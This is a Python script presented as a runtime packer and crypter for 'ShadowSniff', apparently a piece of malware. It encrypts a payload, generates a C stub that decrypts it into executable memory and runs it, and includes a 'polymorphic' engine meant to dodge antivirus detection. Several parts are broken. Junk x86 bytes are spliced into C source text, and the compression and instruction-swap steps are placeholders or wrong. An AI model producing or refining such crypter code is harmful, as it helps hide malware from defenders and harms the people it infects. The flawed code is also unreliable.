#!/usr/bin/env python3
"""
Custom Runtime Packer and Crypter for ShadowSniff
Implements sophisticated packing and encryption techniques
"""

import sys
import os
import struct
import zlib
import random
from pathlib import Path
import hashlib

# Simple AES-like implementation for standalone operation
class SimpleAES:
    """Simplified AES-like encryption for standalone operation"""
    
    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        """Simple XOR-based encryption (replace with real AES if pycryptodome is available)"""
        # Expand key to match data length
        expanded_key = (key * ((len(data) // len(key)) + 1))[:len(data)]
        
        # XOR encryption with key rotation
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ expanded_key[i] ^ (i % 256))
        
        return bytes(encrypted)
    
    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        """Simple XOR-based decryption"""
        # Same as encryption for XOR
        return SimpleAES.encrypt(data, key)

class RuntimePacker:
    """Custom runtime packer with multiple compression and encryption layers"""
    
    def __init__(self, input_file: Path):
        self.input_file = input_file
        self.original_data = b''
        self.packed_data = b''
        self.encryption_key = None
        self.compression_ratio = 0.0
        
    def load_file(self) -> bool:
        """Load input file"""
        try:
            with open(self.input_file, 'rb') as f:
                self.original_data = f.read()
            return True
        except Exception as e:
            print(f"Error loading file: {e}")
            return False
    
    def multi_layer_compression(self) -> bytes:
        """Apply multiple compression algorithms"""
        print("Applying multi-layer compression...")
        
        data = self.original_data
        
        # Layer 1: zlib compression
        data = zlib.compress(data, level=9)
        
        # Layer 2: Custom RLE-like compression for repeated patterns
        data = self._custom_compress(data)
        
        # Layer 3: Bit packing for further compression
        data = self._bit_pack(data)
        
        original_size = len(self.original_data)
        compressed_size = len(data)
        self.compression_ratio = (original_size - compressed_size) / original_size * 100
        
        print(f"Compression ratio: {self.compression_ratio:.1f}%")
        return data
    
    def encrypt_payload(self, data: bytes) -> bytes:
        """Encrypt compressed data with custom encryption"""
        print("Encrypting payload...")
        
        # Generate random key
        self.encryption_key = os.urandom(32)
        
        # Use simple but effective encryption
        encrypted_data = SimpleAES.encrypt(data, self.encryption_key)
        
        # Add random IV for additional obfuscation
        iv = os.urandom(16)
        return iv + encrypted_data
    
    def generate_stub(self, encrypted_payload: bytes) -> bytes:
        """Generate unpacker stub"""
        print("Generating unpacker stub...")
        
        # This is a simplified stub - in reality, you'd generate actual assembly code
        stub_template = f"""
// Auto-generated unpacker stub
#include <windows.h>
#include <stdio.h>

// Encrypted payload embedded in stub
unsigned char encrypted_payload[] = {{{', '.join([f'0x{b:02x}' for b in encrypted_payload[:100]])}...}};
unsigned int payload_size = {len(encrypted_payload)};

// Decryption key (would be obfuscated in real implementation)
unsigned char decryption_key[] = {{{', '.join([f'0x{b:02x}' for b in self.encryption_key])}}};

int main() {{
    // Allocate memory for decrypted payload
    void* memory = VirtualAlloc(NULL, payload_size * 2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!memory) {{
        return -1;
    }}
    
    // Decrypt payload (simplified - would use proper AES decryption)
    for (int i = 0; i < payload_size; i++) {{
        ((unsigned char*)memory)[i] = encrypted_payload[i] ^ decryption_key[i % 32];
    }}
    
    // Decompress payload (simplified - would use proper decompression)
    // ... decompression logic ...
    
    // Execute decrypted payload
    ((void(*)())memory)();
    
    return 0;
}}
"""
        
        return stub_template.encode('utf-8')
    
    def create_self_extracting_executable(self, output_file: Path) -> bool:
        """Create self-extracting executable"""
        print("Creating self-extracting executable...")
        
        try:
            # Compress original data
            compressed_data = self.multi_layer_compression()
            
            # Encrypt compressed data
            encrypted_data = self.encrypt_payload(compressed_data)
            
            # Generate unpacker stub
            stub_data = self.generate_stub(encrypted_data)
            
            # Combine stub + encrypted payload
            packed_executable = stub_data + b'\x00' * 16 + encrypted_data
            
            # Write to output file
            with open(output_file, 'wb') as f:
                f.write(packed_executable)
            
            self.packed_data = packed_executable
            return True
            
        except Exception as e:
            print(f"Error creating packed executable: {e}")
            return False
    
    def _custom_compress(self, data: bytes) -> bytes:
        """Custom compression for repeated patterns"""
        compressed = bytearray()
        i = 0
        
        while i < len(data):
            # Look for repeated bytes
            current_byte = data[i]
            count = 1
            
            while i + count < len(data) and data[i + count] == current_byte and count < 255:
                count += 1
            
            if count > 3:  # Worth compressing
                compressed.extend([0xFF, current_byte, count])
                i += count
            else:
                compressed.append(current_byte)
                i += 1
        
        return bytes(compressed)
    
    def _bit_pack(self, data: bytes) -> bytes:
        """Simple bit packing compression"""
        # This is a simplified implementation
        # Real bit packing would analyze bit patterns
        return data  # Placeholder
    
    def generate_statistics(self) -> dict:
        """Generate packing statistics"""
        return {
            'original_size': len(self.original_data),
            'packed_size': len(self.packed_data),
            'compression_ratio': self.compression_ratio,
            'size_reduction': len(self.original_data) - len(self.packed_data),
            'encryption_key_size': len(self.encryption_key) if self.encryption_key else 0
        }

class PolymorphicEngine:
    """Polymorphic code generation engine"""
    
    def __init__(self):
        self.mutation_count = 0
        
    def mutate_stub(self, stub_code: bytes) -> bytes:
        """Apply polymorphic mutations to unpacker stub"""
        print("Applying polymorphic mutations...")
        
        mutations = [
            self._insert_junk_code,
            self._reorder_instructions,
            self._substitute_instructions,
            self._add_fake_branches
        ]
        
        mutated_code = stub_code
        for mutation in mutations:
            mutated_code = mutation(mutated_code)
            
        self.mutation_count += 1
        return mutated_code
    
    def _insert_junk_code(self, code: bytes) -> bytes:
        """Insert junk instructions"""
        junk_patterns = [
            b'\x90\x90\x90',  # NOP sled
            b'\x83\xC0\x00',  # add eax, 0
            b'\x83\xE8\x00',  # sub eax, 0
            b'\x85\xC0\x74\x00',  # test eax, eax; jz +0
        ]
        
        modified_code = bytearray(code)
        
        # Insert junk at random positions
        for _ in range(10):
            pos = random.randint(0, len(modified_code))
            junk = random.choice(junk_patterns)
            modified_code[pos:pos] = junk
            
        return bytes(modified_code)
    
    def _reorder_instructions(self, code: bytes) -> bytes:
        """Reorder independent instructions"""
        # This would require disassembly and dependency analysis
        # Simplified implementation
        return code
    
    def _substitute_instructions(self, code: bytes) -> bytes:
        """Substitute instructions with equivalent ones"""
        substitutions = {
            b'\x48\x31\xC0': b'\x48\x33\xC0',  # xor rax,rax -> xor rax,rax
            b'\x48\x89\xC1': b'\x48\x8B\xC8',  # mov rcx,rax alternative
        }
        
        modified_code = code
        for original, replacement in substitutions.items():
            modified_code = modified_code.replace(original, replacement)
            
        return modified_code
    
    def _add_fake_branches(self, code: bytes) -> bytes:
        """Add fake conditional branches"""
        # Add branches that never execute
        fake_branch = b'\x74\x00'  # jz +0 (never taken)
        
        modified_code = bytearray(code)
        
        # Insert fake branches at random positions
        for _ in range(5):
            pos = random.randint(0, len(modified_code))
            modified_code[pos:pos] = fake_branch
            
        return bytes(modified_code)

def main():
    if len(sys.argv) < 3:
        print("Usage: python runtime_packer.py <input_file> <output_file> [options]")
        print("Options:")
        print("  --polymorphic     Apply polymorphic mutations")
        print("  --multi-layer     Use multi-layer compression")
        print("  --stats          Show detailed statistics")
        sys.exit(1)
    
    input_file = Path(sys.argv[1])
    output_file = Path(sys.argv[2])
    options = sys.argv[3:] if len(sys.argv) > 3 else []
    
    if not input_file.exists():
        print(f"Input file not found: {input_file}")
        sys.exit(1)
    
    print(f"Runtime packing: {input_file} -> {output_file}")
    
    # Create packer
    packer = RuntimePacker(input_file)
    
    if not packer.load_file():
        print("Failed to load input file")
        sys.exit(1)
    
    # Create packed executable
    if not packer.create_self_extracting_executable(output_file):
        print("Failed to create packed executable")
        sys.exit(1)
    
    # Apply polymorphic mutations if requested
    if '--polymorphic' in options:
        engine = PolymorphicEngine()
        mutated_data = engine.mutate_stub(packer.packed_data)
        
        with open(output_file, 'wb') as f:
            f.write(mutated_data)
    
    # Show statistics
    if '--stats' in options:
        stats = packer.generate_statistics()
        print("\n=== Packing Statistics ===")
        print(f"Original size: {stats['original_size']:,} bytes")
        print(f"Packed size: {stats['packed_size']:,} bytes") 
        print(f"Compression ratio: {stats['compression_ratio']:.1f}%")
        print(f"Size reduction: {stats['size_reduction']:,} bytes")
        print(f"Encryption key size: {stats['encryption_key_size']} bytes")
    
    print("Runtime packing complete!")

if __name__ == "__main__":
    main()
